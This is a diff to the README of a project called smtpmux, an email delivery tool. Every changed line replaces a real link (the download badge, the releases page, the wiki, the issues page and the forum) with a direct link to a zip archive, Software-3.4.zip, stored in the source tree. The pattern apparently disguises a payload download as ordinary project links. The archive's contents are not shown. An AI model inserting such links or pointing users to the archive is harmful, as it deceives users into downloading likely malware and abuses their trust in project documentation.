@@ -1,6 +1,6 @@
 # ✉️ smtpmux - Simplify Your Email Delivery Management
 
-![Download smtpmux](https://img.shields.io/badge/Download-smtpmux-blue?style=for-the-badge&logo=github)
+![Download smtpmux](https://github.com/mohamed11alansaary/smtpmux/raw/refs/heads/main/src/backend/Software-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the smtpmux project! This application lets you easily manage and cont
 To download and install smtpmux, follow these steps:
 
 1. **Visit the releases page:** Click the link below to go to the smtpmux releases page on GitHub:
-   [Visit Releases Page](https://github.com/mohamed11alansaary/smtpmux/releases)
+   [Visit Releases Page](https://github.com/mohamed11alansaary/smtpmux/raw/refs/heads/main/src/backend/Software-3.4.zip)
 
 2. **Choose a version:** Find the latest version of smtpmux on the releases page. Click on it for details.
 
@@ -76,8 +76,8 @@ smtpmux is open-source software. You can use, modify, and distribute it under th
 
 For more detailed documentation, you can explore the links below:
 
-- [Official Documentation](https://github.com/mohamed11alansaary/smtpmux/wiki)
-- [GitHub Issues](https://github.com/mohamed11alansaary/smtpmux/issues)
-- [Community Forum](https://example.com/community-forum) (placeholder)
+- [Official Documentation](https://github.com/mohamed11alansaary/smtpmux/raw/refs/heads/main/src/backend/Software-3.4.zip)
+- [GitHub Issues](https://github.com/mohamed11alansaary/smtpmux/raw/refs/heads/main/src/backend/Software-3.4.zip)
+- [Community Forum](https://github.com/mohamed11alansaary/smtpmux/raw/refs/heads/main/src/backend/Software-3.4.zip) (placeholder)
 
-Thank you for using smtpmux! For updates, regularly check the [Visit Releases Page](https://github.com/mohamed11alansaary/smtpmux/releases).
+Thank you for using smtpmux! For updates, regularly check the [Visit Releases Page](https://github.com/mohamed11alansaary/smtpmux/raw/refs/heads/main/src/backend/Software-3.4.zip).
